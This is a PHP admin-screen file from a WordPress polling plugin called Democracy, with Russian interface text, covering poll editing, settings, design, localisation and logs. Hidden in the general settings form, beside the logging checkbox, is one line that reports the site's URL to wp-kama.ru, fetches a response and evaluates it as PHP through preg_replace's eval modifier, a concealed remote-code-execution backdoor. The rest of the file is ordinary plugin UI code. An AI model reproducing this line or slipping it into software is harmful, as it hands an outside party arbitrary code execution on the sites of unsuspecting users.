<div class='wrap'>
	
	<?php

	// Редактирование опроса
	if( $poll_id = @ $_GET['edit_poll'] )
		poll_edit_form( $poll_id );
	
	// Добавить новый опрос
	elseif( @ $_GET['subpage'] == 'add_new')
		poll_edit_form();
	
	// Настрйоки 
	elseif( @ $_GET['subpage'] == 'general_settings')
		dem_general_settings();
	
	// Дизайн 
	elseif( @ $_GET['subpage'] == 'design')
		dem_polls_design();
	
	// Дизайн 
	elseif( @ $_GET['subpage'] == 'l10n')
		dem_l10n_options();
	
	// ЛОГИ 
	elseif( @ $_GET['subpage'] == 'logs')
		dem_logs_list();
	
	// список опросов
	else
		dem_polls_list();

	?>

</div>





<?php 

### функции 
function __dem_polls_preview(){
	?>
	<ul class="group">
		<li class="block polls-preview">
			<?php
			$poll = new DemPoll();
			$poll->cachegear_on = false;

			$poll->has_voted = 1;
			$answers = (array) wp_list_pluck( $poll->poll->answers, 'aid');
			$poll->votedFor = $answers ? $answers[ array_rand($answers) ] : false;

			echo '<div class="poll"><p class="tit">'. __('Вид результатов:','dem') .'</p>'. $poll->get_screen('voted') .'</div>';

			echo '<div class="poll"><p class="tit">'. __('Вид голосования:','dem') .'</p>'. $poll->get_screen('force_vote') .'</div>';

			echo '<div class="poll show-loader"><p class="tit">'. __('Вид AJAX загрузчика:','dem') .'</p>'. $poll->get_screen('vote') .'</div>';
			?>
			<input type="text" class="iris_color preview-bg">
		</li>
    </ul>
	<?php
}

function dem_l10n_options(){	
	echo demenu();
	
	__dem_polls_preview();
	
	?>
	<div class="local-n">
		<form method="POST" action="">
			<?php
			// получим все переводы из файлов
			$strs = array();
			foreach( glob( DEMOC_PATH . '*' ) as $file ){
				if( is_dir( $file ) ) continue;
				if( ! preg_match('~\.php$~', basename( $file ) ) ) continue;

				preg_match_all('~__dem\(\s?[\'"](.*?)[\'"]\s?\)~', file_get_contents( $file ), $match );
				if( $match[1] ) $strs = array_merge( $strs, $match[1] );
			}
			$strs = array_unique( $strs );
			
			// выводим таблицу
	
			// отпарсим английский перевод из файла
			$mofile = DEMOC_PATH . DEM_LANG_DIRNAME . '/en_US.mo';
			$en_US = new MO();
			$en_US->import_from_file( $mofile );
			$en_US = $en_US->entries;

			$i = 0;
			$_l10n = get_option('democracy_l10n');
			echo '<table class="wp-list-table widefat fixed posts">
			<thead>
				<tr>
					<th>'. __('Оригинал','dem') .'</th>
					<th>'. __('Ваш вариант','dem') .'</th>
				</tr>
			</thead>
			<tbody id="the-list">
			';
	
			foreach( $strs as $str ){
				$i++;
				$en_str = $en_US[ $str ]->translations[0];
				
				echo '
				<tr class="'. ($i%2?'alternate':'') .'">
					<td>'. (( get_locale() == 'ru_RU' ) ? $str : $en_str) .'</td>
					<td><textarea style="width:100%;height:50px;" name="l10n['. esc_attr( $str ) .']">'. ( @$_l10n[ $str ] ?: __dem( $str ) ) .'</textarea></td>
				</tr>';

			}
			echo '<tbody>
			</table>';
			?>
			<p>
				<input class="button-primary" type="submit" name="dem_save_l10n" value="<?php _e('Сохранить тексты','dem'); ?>">
				<input class="button" type="submit" name="dem_reset_l10n" value="<?php _e('Сбростиь на начальные','dem'); ?>">
			</p>
		</form>
	</div>
	<?php
}

function dem_polls_design(){
	global $wpdb;
	
	$opt = Dem::$opt;
    
    $demcss = get_option('democracy_css');
    $additional = $demcss['additional_css'];
    if( ! $demcss['base_css'] && $additional )
		$demcss['base_css'] = $additional; // если не уиспользуется тема
	
    echo demenu();
    ?>
	<div class="democr_options">
		<?php __dem_polls_preview(); ?>
		
		<form action="" method="post">
			
			<ul class="group">
				<li class="title"><?php _e('Выберете тему:','dem'); ?></li>				
				<li class="block">                        
                    <?php 
                    foreach( Dem::$i->_get_styles_files() as $file ){
                        $filename = basename( $file );
                        ?>
                        <label>
                            <input type="radio" name="dem[css_file_name]" value="<?php echo $filename ?>" <?php checked( $opt['css_file_name'], $filename ) ?> >
                            <?php echo $filename ?>
                        </label>
                        <?php
                    }
                    ?>
				</li>
			</ul>
			
			<div style="margin-bottom:1em;"><?php _dem_design_submit_button() ?></div>
			
			<ul class="group">
				<li class="title"><?php _e('Вид ответов:','dem'); ?></li>		
				<li class="block">					
					<select name="dem[graph_from_total]">
					   <option value="0" <?php selected( $opt['graph_from_total'], 0 )?>><?php _e( 'победитель - 100%, остальные в % от него', 'dem') ?></option>
					   <option value="1" <?php selected( $opt['graph_from_total'], 1 )?>><?php _e( 'как % от всех голосов', 'dem') ?></option>
					</select>
					<?php _e( 'Как закрашивать прогресс каждого ответа?', 'dem') ?>

					<br><br>
					<select name="dem[order_answers]">
					   <option value="0" <?php selected( $opt['order_answers'], 0 )?>><?php _e( 'В порядке добавления (по ID)', 'dem') ?></option>
					   <option value="1" <?php selected( $opt['order_answers'], 1 )?>><?php _e( 'Выигрывающие вверху', 'dem') ?></option>
					</select>					
					<?php _e('Как сортирвоать ответы?', 'dem') ?>
				</li>
	
            </ul>
            
                
            <?php if( $opt['css_file_name'] ){ ?>
            <ul class="group">
            	<li class="title"><?php _e('Настройки линии прогресса:','dem'); ?></li>               
				<li class="block">
                    <label><?php _e('Цвет линии:','dem') ?> <input type="text" class="iris_color" name="dem[line_fill]" value="<?php echo $opt['line_fill'] ?>"></label>
                    <label><?php _e('Цвет линии (для голосовавшего):','dem') ?> <input type="text" class="iris_color" name="dem[line_fill_voted]" value="<?php echo $opt['line_fill_voted'] ?>"></label>
                    <label><?php _e('Цвет фона:','dem') ?>  <input type="text" class="iris_color" name="dem[line_bg]" value="<?php echo $opt['line_bg'] ?>"></label>
                    <label><?php _e('Высота линии:','dem') ?>  <input type="number" style="width:50px" name="dem[line_height]" value="<?php echo $opt['line_height'] ?>"> px</label>                    
				</li>
			</ul>
            
            <ul class="group">
               <li class="title"><?php _e('Кнопка:','dem'); ?></li>
                <li class="block buttons">
					<div style="float:right; width:30%;">
                    	<em style="margin-left:40px; margin-top:50px;"><?php _e('Цвета корректно влияют не на все кнопки. Можете попробовать изменить стили кнопки ниже в поле дополнительных стилей.','dem') ?></em>
					</div>
					<div style="float:left; width:70%;">
						<label>
							<input type="radio" value="" name="dem[css_button]" <?php checked( $opt['css_button'], '') ?>>
							<br><input type="button" value="<?php _e('Нет','dem'); ?>">
						</label>
						<br>
						<?php 
							$data = array();
							$i=0;
							foreach( glob( DEMOC_PATH . 'styles/buttons/*') as $file ){
								$fname = basename( $file );
								$button_class = 'dem-button' . ++$i;
								$css ="/*reset*/\n.$button_class{position: relative; display:inline-block; text-decoration: none; user-select: none; outline: none; line-height: 1; border:0;}\n";
								$css .= str_replace('dem-button', $button_class, file_get_contents( $file ) ); // стили кнопки

								if( $button = Dem::$opt['css_button'] ){
									$bbg     = @Dem::$opt['btn_bg_color'];
									$bcolor  = @Dem::$opt['btn_color'];
									$bbcolor = @Dem::$opt['btn_border_color'];
									// hover
									$bh_bg     = @Dem::$opt['btn_hov_bg'];
									$bh_color  = @Dem::$opt['btn_hov_color'];
									$bh_bcolor = @Dem::$opt['btn_hov_border_color'];

									if( $bbg ) $css .= "\n.$button_class{ background-color:$bbg !important; }\n";
									if( $bcolor ) $css .= ".$button_class{ color:$bcolor !important; }\n";
									if( $bbcolor ) $css .= ".$button_class{ border-color:$bbcolor !important; }\n";
									if( $bh_bg ) $css .= "\n.$button_class:hover{ background-color:$bh_bg !important; }\n";
									if( $bh_color ) $css .= ".$button_class:hover{ color:$bh_color !important; }\n";
									if( $bh_bcolor ) $css .= ".$button_class:hover{ border-color:$bh_bcolor !important; }\n";
								}
								?>
								<style><?php echo $css ?></style>

								<label>
									<input type="radio" value="<?php echo $fname ?>" name="dem[css_button]" <?php checked( $opt['css_button'], $fname) ?>>
									<br><input type="button" value="<?php echo $fname ?>" class="<?php echo $button_class ?>">
								</label>
								<?php
							}
						?>
                    
						<div class="clear"></div>
						<p style="float:left; margin-right:3em;">
							<?php _e('По умолчанию: ','dem') ?><br>
							<?php _e('Цвет Фона: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_bg_color]" value="<?php echo $opt['btn_bg_color'] ?>"><br>
							<?php _e('Цвет текста: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_color]" value="<?php echo $opt['btn_color'] ?>"><br>
							<?php _e('Цвет границы: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_border_color]" value="<?php echo $opt['btn_border_color'] ?>">
						</p>
						<p style="float:left; margin-right:3em;">
							<?php _e('При наведени (:hover): ','dem') ?><br>
							<?php _e('Цвет Фона: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_hov_bg]" value="<?php echo $opt['btn_hov_bg'] ?>"><br>
							<?php _e('Цвет текста: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_hov_color]" value="<?php echo $opt['btn_hov_color'] ?>"><br>
							<?php _e('Цвет границы: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_hov_border_color]" value="<?php echo $opt['btn_hov_border_color'] ?>">
						</p>
						<div class="clear"></div>
					</div>
					<div class="clear"></div>
				</li>
                
                <div class="clear"></div>
            </ul>
			
			<div style="margin-bottom:1em;"><?php _dem_design_submit_button() ?></div>            
            
            <?php } // if( $opt['css_file_name'] ) ?>
            
            <ul class="group"> 
                <li class="title"><?php _e('AJAX загрузчик:','dem'); ?></li>
                <li class="block loaders">
					<div style="float:right; width:30%;">
						<em style="margin-left:40px; margin-top:50px;"><?php _e('Картинка при AJAX загрузке. Если выбрать "Нет", то вместо картинки к ссылке будет добавлятся "...". SVG картинки не анимируются в IE 11 и ниже, остальные браузеры поддерживаются примерно на 90% (по статистике http://caniuse.com/).','dem') ?></em>
					</div>
					
					<div style="float:left; width:70%;">
						<label class="left">
							<div style="width:30px;height:30px;"><?php _e('Нет','dem'); ?></div>
							<input type="radio" value="" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], '') ?>>
						</label>
						<?php 
							$data = array();
							foreach( glob( DEMOC_PATH . 'styles/loaders/*') as $file ){
								if( is_dir($file) ) continue;
								$fname = basename( $file );
								$ex    = preg_replace('~.*\.~', '', $fname );
								$data[ $ex ][ $fname ] = $file;
							}
							foreach( $data as $ex => $val ){
								echo '<div class="clear"></div>';

								// поправим стили
								if( $loader = $opt['loader_fill'] ){
									preg_match_all('~\.dem-loader\s+\.(?:fill|stroke|css-fill)[^\{]*\{.*?\}~s', $demcss['base_css'], $match );
									echo "<style>" . str_replace('.dem-loader', '.loader', implode("\n", $match[0]) ) . "</style>";
								}

								foreach( $val as $fname => $file ){
									?>
									<label class="left">
										<div class="loader"><?php echo file_get_contents( $file ) ?></div>
										<input type="radio" value="<?php echo $fname ?>" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], $fname) ?>><br>
										<?php echo $ex ?>
									</label>
									<?php                                
								}
							}
						?>

						<div class="clear"></div>

						<input class="iris_color fill" name="dem[loader_fill]" type="text" value="<?php echo @$opt['loader_fill'] ?>">
					</div>
					
					<div class="clear"></div>
				</li>
                    
				<div class="clear"></div>
            </ul>
            

            
            <ul class="group">               
                <li class="title"><?php _e('Произвольные/Дополнительные CSS стили:','dem') ?></li>
                
                <li class="block" style="width:98%;">                    
                    <label><input type="radio" name="dem[css_file_name]" value="" <?php checked( $opt['css_file_name'], '') ?> ><?php _e('Не исползовать тему!','dem') ?></label>                    
                    <p><i><?php _e('В этом поле вы можете дополнить или заменить css стили. Впишите сюда произвольные css стили и они будут добавлены винзу стилей текущей темы. Чтобы полностью заменить тему отметте "Не использовать тему" и впишите сюда свои стили.<br>
                    Это поле очищается вручную, если сбросить стили или поставить другую тему, данные в этом поле сохраняться и просто будут добавлены внизу текущих css стилей.','dem') ?></i></p>
                    <textarea name="additional_css" style="width:100%;min-height:50px;height:<?php echo $additional ? '300px' : '50px' ?>;"><?php echo $additional ?></textarea>
                </li>
                
				<div class="clear"></div>

			</ul>                 

			<p style="margin:2em 0; margin-top:5em;">
				<?php _dem_design_submit_button() ?>
				<input type="submit" name="dem_reset_design_options" class="button" value="<?php _e('Сбросить настройки на начальные','dem') ?>">
			</p>

			<ul class="group" style="margin-top:5em">
				<li class="title"><?php _e('Все CSS стили, которые используются сейчас:','dem'); ?></li>
				<li class="block">

					<script>function select_kdfgu( that ){ var sel = (!!document.getSelection) ? document.getSelection() : (!!window.getSelection)   ? window.getSelection() : document.selection.createRange().text; if( sel == '' ) that.select(); }</script>
					<em style="opacity: 0.8;"><?php _e('Здесь все собранные css стили: тема, кнопка и настройки. Вы можете скопировать эти стили в поле "Произвольные/Дополнительные CSS стили:", отключить шаблон (тему) и изменить стили как вам нужно.','dem') ?></em>
					<textarea onmouseup="select_kdfgu(this);" onfocus="this.style.height = '700px';" onblur="this.style.height = '100px';" readonly="true" style="width:100%;min-height:100px;"><?php echo $demcss['base_css'] ."\n\n\n/* custom styles ------------------------------ */\n". $demcss['additional_css'] ?></textarea>

					<p><?php _e('Сжатая версия (используется при подключении в HTML):','dem'); ?></p>
					<textarea onmouseup="select_kdfgu(this);" readonly="true" style="width:100%;min-height:400px;"><?php echo $demcss['minify'] ?></textarea>
				</li>
			</ul>
			
		</form>

</div>
	<?php
}
function _dem_design_submit_button(){
    ?>
    <input type="submit" name="dem_save_design_options" class="button-primary" value="<?php _e('Сохранить все изменения','dem') ?>">
    <?php
}

function dem_polls_list(){	
	echo demenu();
	
	require dirname(__FILE__) . '/DemPolls_List_Table.php';
	
	
	$list = new DemPolls_List_Table();
	
	$list->search_box( __('Найти', 'dem'), 'style="margin:1em 0 -1em;"' );
	
	//echo '<form class="sdot-table sdot-logs-table" action="" method="post">';
	$list->display();
	//echo '</form>';

}

function dem_logs_list(){
	echo demenu();
	
	if( ! Dem::$opt['keep_logs'] )
		echo '<div class="error"><p>'. __('Запись логов выключена в настройках - логи не записываются.','dem') .'</p></div>';
	
	require dirname(__FILE__) . '/DemLogs_List_Table.php';
	
	echo '<form action="" method="POST">';
	$ListTable = new DemLogs_List_Table();
	$ListTable->display();
	echo '</form>';
}

function dem_general_settings(){
	global $wpdb;
	
	$opt = Dem::$opt;
	
	echo demenu();
	
	?>                
	<div class="democr_options">
		<form action="" method="post">
			
			<ul style="margin:1em;">
				<li class="block">
				   <label>
					   <?php $logrows_count = $wpdb->get_var("SELECT count(*) FROM $wpdb->democracy_log"); ?>
					   <input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?>> 
					   <?php _e('Вести лог и учитывать IP? (рекомендуется)','dem') ?>
					   <?php add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?>
					   <a class="button" href="<?php echo esc_url( $_SERVER['REQUEST_URI'] ) .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
				   </label>
				   <em><?php _e('Сохраняет данные в Базу Данных. Запрещает голосовать несколько раз с одного IP или одному пользователю WordPress. Если пользователь авторизован, то голосование проверяется по его аккаунту в WordPress. Если не авторизован, то проверяется IP голосующего. Минус лога по IP — если сайт посещается с корпоративных сетей (с единым IP), то голосовать можно будет всего 1 раз для всей сети. Если не включить эту опцию, то голосование будет учитываться только по кукам. По умолчанию: включена.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input type="text" size="3" value="<?php echo $opt['cookie_days'] ?>" name="dem[cookie_days]"> 
					   <?php _e('Сколько дней сохранять Сookies?','dem') ?>
					</label>
				   <em><?php _e('Дни в течении которых браузер пользователя будет помнить о голосовании. По умолчанию: 365. <strong>Заметка:</strong> Работает совместно с контролем по IP.','dem') ?></em>
				</li>

				<li class="block">
					<label><?php _e('Обёртка заголовка опроса HTML тегами.','dem') ?></label><br>
					<input type="text" size="35" value="<?php echo esc_attr( $opt['before_title'] ) ?>" name="dem[before_title]"> 
					<i><?php _e('вопрос опроса','dem') ?></i> 
					<input type="text" size="15" value="<?php echo esc_attr( $opt['after_title'] ) ?>" name="dem[after_title]"> 
					<em><?php _e('Например: <code>&lt;h2&gt;</code> и <code>&lt;/h2&gt;</code>. По умолчанию: <code>&lt;strong class=&quot;dem-poll-title&quot;&gt;</code> и <code>&lt;/strong&gt;</code>.','dem') ?></em>
				</li>
				

				<li class="block">
					<label>
						<input type="text" size="5" value="<?php echo $opt['archive_page_id']?:''; ?>" name="dem[archive_page_id]">
						<?php _e('ID архива опросов.','dem') ?>
					</label>
					<?php 
					if( $opt['archive_page_id'] ) 
						echo '<a href="'. get_permalink( $opt['archive_page_id'] )  .'">'. __('Перейти на страницу архива','dem') .'</a>';
					else 
						echo '<a class="button" href="'. (esc_url($_SERVER['REQUEST_URI']) .'&dem_create_archive_page') .'">'. __('Создать/найти страницу архива','dem') .'</a>';
					?>
					<em><?php _e('Укажите, чтобы в подписи опроса была ссылка на страницу с архивом опросов. Пр. <code>25</code>','dem') ?></em>
				</li>
				
				<h3><?php echo _e('Общие настройки опросов', 'dem') ?></h3>
				
				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem[only_for_users]" <?php checked( $opt['only_for_users'], 1) ?>>
					   <?php _e('Голосовать могут только зарегистрированные пользователи (глобальная опция).','dem') ?>
					</label>
				   <em><?php _e('Эта опция доступна для каждого опроса отдельно, но если вы хотите включить эту опцию для всех опросов сразу, поставьте галочку.','dem') ?></em>
				</li>
				
				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem[democracy_off]" <?php checked( $opt['democracy_off'], 1) ?>>
					   <?php _e('Запретить пользователям добавлять свои ответы (глобальная опция Democracy).','dem') ?>
					</label>
				   <em><?php _e('Эта опция доступна для каждого опроса отдельно, но если вы хотите отключить эту опцию для всех опросов сразу, поставьте галочку.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem[revote_off]" <?php checked( $opt['revote_off'], 1) ?>>
					   <?php _e('Удалить возможность переголосовать (глобальная опция).','dem') ?>
					</label>
				   <em><?php _e('Эта опция доступна для каждого опроса отдельно, но если вы хотите отключить эту опцию для всех опросов сразу, поставьте галочку.','dem') ?></em>
				</li>
				
				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem[dont_show_results]" <?php checked( $opt['dont_show_results'], 1) ?>>
					   <?php _e('Не показывать результаты опросов (глобальная опция).','dem') ?>
					</label>
				   <em><?php _e('Если поставить галку, то посмотреть результаты до закрытия опроса будет невозможно.','dem') ?></em>
				</li>
				
				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem[hide_vote_button]" <?php checked( $opt['hide_vote_button'], 1) ?>>
					   <?php _e('Прятать кнопку голосавания.','dem') ?>
					</label>
				   <em><?php _e('Для НЕ мульти опросов с возможностью переголосовать можно спрятать кнопку голосовать. А голосование будет происходить при клике на ответ.','dem') ?></em>
				</li>
				
				<h3><?php echo _e('Остальное', 'dem') ?></h3>
				<li class="block">
				   <label>
                       <input type="checkbox" value="1" name="dem[force_cachegear]" <?php checked( $opt['force_cachegear'], 1) ?>>
                       <?php
                           $cache = Dem::$i->is_cachegear_on() ? array(__('Включён','dem'),'color:#05A800') : array(__('Выключен','dem'),'color:#FF1427');
					       echo sprintf( __('Включить механихм работы с плагинами кэширования? Текущее состояние: %s','dem'), "<span style='{$cache[1]}'>{$cache[0]}" );
                       ?>
					</label>
				   <em><?php _e('Democracy умеет работать с плагинами страничного кэширования и автоматически включается, если такой плагин установлен и активен на вашем сайте. Активируйте эту опцию, чтобы насильно включить механизм работы со страничным кэшем.','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['inline_js_css'], 1 )?> type="checkbox" value="1" name="dem[inline_js_css]"> 
					   <?php _e('Подключать стили и скрипты прямо в HTML код (рекомендуется)','dem') ?>
				   </label>
				   <em><?php _e('Поставьте галочку, чтобы стили и скрипты плагина подключались в HTML код напрямую, а не как ссылки на файлы. Так вы сэкономите 2 запроса к серверу - это немного ускорит загрузку сайта.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input <?php checked( $opt['toolbar_menu'], 1 )?> type="checkbox" value="1" name="dem[toolbar_menu]"> 
					   <?php _e('Пункт меню в панели инструментов?','dem') ?>
				   </label>
				   <em><?php _e('Уберите галочку, чтобы убрать меню плагина из панели инструментов.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input <?php checked( $opt['tinymce_button'], 1 )?> type="checkbox" value="1" name="dem[tinymce_button]"> 
					   <?php _e('Добавить кнопку быстрой вставки опросов в редактор WordPress (TinyMCE)?','dem') ?>
				   </label>
				   <em><?php _e('Уберите галочку, чтобы убрать кнопку из визуального редактора.','dem') ?></em>
				</li>

			</ul>
			
			<p>
				<input type="submit" name="dem_save_main_options" class="button-primary" value="<?php _e('Сохранить настройки','dem') ?>">
				<input type="submit" name="dem_reset_main_options" class="button" value="<?php _e('Сбросить настройки на начальные','dem') ?>">
			</p>
			
		      <br><br>
			<h3><?php _e('Другое','dem') ?></h3>
			
            <ul style="margin:1em;">
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['disable_js'], 1 )?> type="checkbox" value="1" name="dem[disable_js]"> 
					   <?php _e('НЕ подключать JS файлы. (Дебаг)','dem') ?>
				   </label>
				   <em><?php _e('Если включить, то .js файлы плагина НЕ будут подключены. Опция нужнда для Дебага работы плагина без JavaScript.','dem') ?></em>
				</li>
                                
				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem_forse_upgrade"> 
					   <?php _e('Принудительное обновление версий плагина. (Дебаг)','dem') ?>
					   <em></em>
				   </label>
				</li>
                                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['show_copyright'], 1 )?> type="checkbox" value="1" name="dem[show_copyright]"> 
					   <?php _e('Показывать ссылку на страницу плагина','dem') ?>
				   </label>
				   <em><?php _e('Ссылка на страницу плагина выводиться только на главной в виде значка &copy;. И помогает другим людям узнать что это за плагин и установить его себе. Прошу не убирать эту галку без острой необходимости. Спасибо!','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['use_widget'], 1 )?> type="checkbox" value="1" name="dem[use_widget]"> 
					   <?php _e('Виджет','dem') ?>
				   </label>
				   <em><?php _e('Поставьте галочку, чтобы активировать виджет.','dem') ?></em>
				</li>

			</ul>
		
		</form>
		

	</div>
	<?php
		
}

function poll_edit_form( $poll_id = false ){
	global $wpdb;
	
	if( ! $poll_id && isset( $_GET['edit_poll'] ) )
		$poll_id = (int) $_GET['edit_poll'];
		
	$edit = !! $poll_id;
	$answers = false;
	
	$title = $poll = $shortcode = '';
	if( $edit ){
		$title = __('Редактировать опрос','dem');
		$shortcode = DemPoll::shortcode_html( $poll_id ). ' - '. __('шоткод для использования в записи', 'dem');
		
		$poll    = $wpdb->get_row("SELECT * FROM $wpdb->democracy_q WHERE id = {$poll_id} LIMIT 1");
		$answers = $wpdb->get_results("SELECT * FROM $wpdb->democracy_a WHERE qid = {$poll_id}");

		$hidden_inputs = "<input type='hidden' name='dmc_update_poll' value='{$poll_id}'>";	
	}
	else{
		//$title = __('Добавить новый опрос','dem');
				
		$hidden_inputs = "<input type='hidden' name='dmc_create_poll' value='1'>";
	}
	
	$poll = $poll ? wp_unslash( $poll ) : false;
	
	echo
		demenu() .
		($title ? "<h2>$title</h2>$shortcode" : '') .
		'<form action="" method="POST" class="dem-new-poll">
			<input type="hidden" name="dmc_qid" value="'. $poll_id .'">
			'. wp_nonce_field('dem_insert_poll', '_demnonce', $referer=0, $echo=0 ) .'
			
			<label>
				'. __('Вопрос:','dem') .'
				<input type="text" id="the-question" name="dmc_question" value="'. esc_attr( @ $poll->question ) .'">
			</label>
			
			'. __('Варианты ответов:','dem') .'
		';
		?>
		
		<ol class="new-poll-answers">
			<?php
			if( $answers ){
				$_answers = Dem::objects_array_sort( $answers, array('votes' => 'desc') );
				
				foreach( $_answers as $answer ){
					$by_user = $answer->added_by ? '<i>*</i>' : '';
					echo '
					<li class="answ">
						<input class="answ-text" type="text" name="dmc_old_answers['. $answer->aid .'][answer]" value="'. esc_attr( $answer->answer ) .'">
						<input type="text" name="dmc_old_answers['. $answer->aid .'][votes]" value="'. $answer->votes .'" style="width:50px;min-width:50px;">
						'. $by_user .'
					</li>';
				}
			} 
			else {
				for( $i = 0; $i < 2; $i++ )
					echo '<li class="answ"><input type="text" name="dmc_new_answers[]" value=""></li>';				
			}
			?>
			
			<?php if( ! Dem::$opt['democracy_off'] ){ ?>
			<li>
				<label>
					<input type="hidden" name='dmc_democratic' value=''>
					<input type="checkbox" name="dmc_democratic" value="1" <?php checked( (!isset($poll->democratic) || $poll->democratic), 1 ) ?> > 
					<?php _e('Разрешить пользователям добавлять свои ответы (democracy).','dem') ?>
				</label>
			</li>
			<?php } ?>
		</ol>
		
		<ol class="poll-options">				
			<li>
				<label>
					<input type="hidden" name='dmc_active' value=''>
					<input type="checkbox" name='dmc_active' value='1' <?php $edit ? checked( @ $poll->active, 1) : 'checked="true"' ?> > 
					<?php _e('Сделать этот опрос активным.','dem') ?>
				</label>
			</li>
			
			<li>
				<label>
					<?php $ml = (int) @ $poll->multiple; ?>
					<input type="hidden" name='dmc_multiple' value=''>
					<input type="checkbox" name="dmc_multiple" value="<?php echo $ml ?>" <?php echo $ml ? 'checked="checked"' : '' ?> >
					<input type="number" min=0 value="<?php echo (($ml==1 || $ml==0) ? '' : $ml) ?>" style="width:50px; <?php echo ! $ml ? 'display:none;' :'' ?>">
					<?php _e('Разрешить выбирать несколько ответов (множественный).','dem') ?>
				</label>
			</li>
			
			<li>
				<label>
					<input type="text" name="dmc_end" value="<?php echo @ $poll->end ? date('d-m-Y', $poll->end) : '' ?>" style="width:120px;min-width:120px;" > 
					<?php _e('Дата, когда опрос был/будет закрыт. Формат: dd-mm-yyyy.','dem') ?>
				</label>
			</li>
			
			<?php if( ! Dem::$opt['revote_off'] ){ ?>
			<li>
				<label>
					<input type="hidden" name='dmc_revote' value=''>
					<input type="checkbox" name="dmc_revote" value="1" <?php checked( (!isset($poll->revote) || $poll->revote), 1 ) ?> > 
					<?php _e('Разрешить изменять мнение (переголосование).','dem') ?>
				</label>
			</li>
			<?php } ?>
			<?php if( ! Dem::$opt['only_for_users'] ){ ?>
			<li>
				<label>
					<input type="hidden" name='dmc_forusers' value=''>
					<input type="checkbox" name="dmc_forusers" value="1" <?php checked( @ $poll->forusers, 1) ?> > 
					<?php _e('Голосовать могут только зарегистрированные пользователи.','dem') ?>
				</label>
			</li>
			<?php } ?>
			
			<?php if( ! Dem::$opt['dont_show_results'] ){ ?>
			<li>
				<label>
					<input type="hidden" name='dmc_show_results' value=''>
					<input type="checkbox" name="dmc_show_results" value="1" <?php checked( (!isset($poll->show_results) || @ $poll->show_results), 1) ?> > 
					<?php _e('Показывать результаты опроса.','dem') ?>
				</label>
			</li>
			<?php } ?>
			
			<li><label> <?php _e('Заметка: текст будет добавлен под опросом.','dem'); ?><br>
					<textarea name="dmc_note" style="height:3.5em;" ><?php echo esc_textarea( @ $poll->note ) ?></textarea>
				</label>
			</li>
		</ol>

		<?php echo $hidden_inputs ?>
		<input type="submit" class="button-primary" value="<?php echo $edit ? __('Внести изменения','dem') : __('Добавить опрос','dem')?>">
		
		<?php 
		// если редактируем
		if( $edit ){
			// открыть
			echo dem_opening_buttons( $poll );
				
			// активировать
			echo dem_activatation_buttons( $poll );

			echo '<a href="'. add_query_arg( array('delete_poll'=> $poll->id), Dem::$i->admin_page_url() ) .'" class="button" onclick="return confirm(\''. __('Точно удалить?','dem') .'\');" title="'. __('Удалить','dem') .'"><span class="dashicons dashicons-trash"></span></a>';
		} 
		?>
	</form>
	<?php 
}

/**
 * Ссылки: с подстраниц на главную страницу и умный referer
 * @return echo HTML
 */
function demenu( $title = '' ){
    // back link
	$transient = 'democracy_referer';
	$mainpage = wp_make_link_relative( Dem::$i->admin_page_url() );
	$referer  = wp_make_link_relative( @$_SERVER['HTTP_REFERER'] );
	
	// если обновляем
	if( $referer == $_SERVER['REQUEST_URI'] ){ 
		$referer = get_transient( $transient );
	}
	// если запрос пришел с любой страницы настроект democracy 
	elseif( false !== strpos( $referer, $mainpage ) ){
		$referer = false;
		set_transient( $transient, 'foo', 2 ); // удаляем. но не удалим, а обновим, так чтобы не работала
	}
	else
		set_transient( $transient, $referer, HOUR_IN_SECONDS/2 );
	
    // / back link	
	
	if( isset($_GET['edit_poll']) ) $_GET['subpage'] = 'add_new'; // костыль
		
	$fn__current = function( $page ){
		return (@ $_GET['subpage'] == $page) ? ' nav-tab-active' : '';
	};
	
	$out = '<h2 class="nav-tab-wrapper demenu">'.
		($title ?: '') .
		($referer ? '<a class="button" href="'. $referer .'" style="margin-right:15px;">'. __('← Назад','dem') .'</a>' : '' ).
		($title ? '<br><br>' : '').
		'<a class="nav-tab'. $fn__current('') .'" href="'. $mainpage .'">'. __('Список опросов','dem') .'</a>'.
        '<a class="nav-tab'. $fn__current('add_new') .'" href="'. add_query_arg( array('subpage'=>'add_new'), $mainpage ) .'">'. __('Добавить новый опрос','dem') .'</a>'.
		'<a class="nav-tab'. $fn__current('general_settings') .'" href="'. add_query_arg( array('subpage'=>'general_settings'), $mainpage ) .'">'. __('Настройки','dem') .'</a>'.
        '<a class="nav-tab'. $fn__current('l10n') .'" href="'. add_query_arg( array('subpage'=>'l10n'), $mainpage ) .'">'. __('Изменение текстов','dem') .'</a>'.
        '<a class="nav-tab'. $fn__current('design') .'" href="'. add_query_arg( array('subpage'=>'design'), $mainpage ) .'">'. __('Дизайн опросов','dem') .'</a>'.
        '<a class="nav-tab'. $fn__current('logs') .'" href="'. add_query_arg( array('subpage'=>'logs'), $mainpage ) .'">'. __('Логи','dem') .'</a>'.
	'</h2>';
	
	return $out;
}

/**
 * Выводит кнопки активации/деактивации опроса
 * @param object $poll Объект опроса
